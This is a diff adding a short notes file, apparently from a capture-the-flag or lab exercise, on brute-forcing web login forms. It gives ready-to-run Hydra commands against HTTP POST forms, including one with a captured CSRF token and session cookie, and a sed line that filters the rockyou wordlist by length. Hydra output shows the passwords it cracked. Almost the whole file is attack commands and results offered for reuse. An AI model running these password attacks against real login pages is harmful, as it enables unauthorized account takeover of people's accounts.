@@ -1,0 +1,31 @@
+#Bruteforce login
+
+#Use burpsuite to capture an initial login once you have a user name (username/fakepassword)
+# Get PHPSESSID/CSRF Token using burpsuite
+#Change inputs specific for the form
+#Hydra
+hydra -l harvey -P /opt/metasploit/data/wordlists/unix_passwords.txt -t 60 monitor.hostname.local http-form-post "/index.php:csrf=e1b6fb89cdca7cd079829dd7134fef483cb4b4cd2432098917e5b6e275de0877&user_name=^USER^&user_password=^PASS^&action=login:F=incorrect:H=Cookie\: PHPSESSID=iqsqnu44aipq5u7o8tke55ts13"
+
+[80][http-post-form] host: monitor.hostname.local   login: harvey   password: potter
+
+[STATUS] 1011.00 tries/min, 1011 tries in 00:01h, 1 to do in 00:01h, 42 active
+1 of 1 target successfully completed, 1 valid password found
+
+
+
+#Create modified version for password length 
+sed -nr '/^.{8,150}$/p' /usr/share/wordlists/rockyou.txt > rockyou8.txt
+
+
+
+#When no CSRF
+#Make sure fields are correct
+#uname
+#passwd
+#submit
+#F= (what it would display if you typed something wrong)
+hydra -l harvey -P rockyou8.txt -t 60 hostname.local http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:F=Invalid Username or Password"
+
+
+[STATUS] 996.00 tries/min, 996 tries in 00:01h, 9605454 to do in 160:45h, 60 active
+[80][http-post-form] host: hostname.local   login: harvey   password: Password1
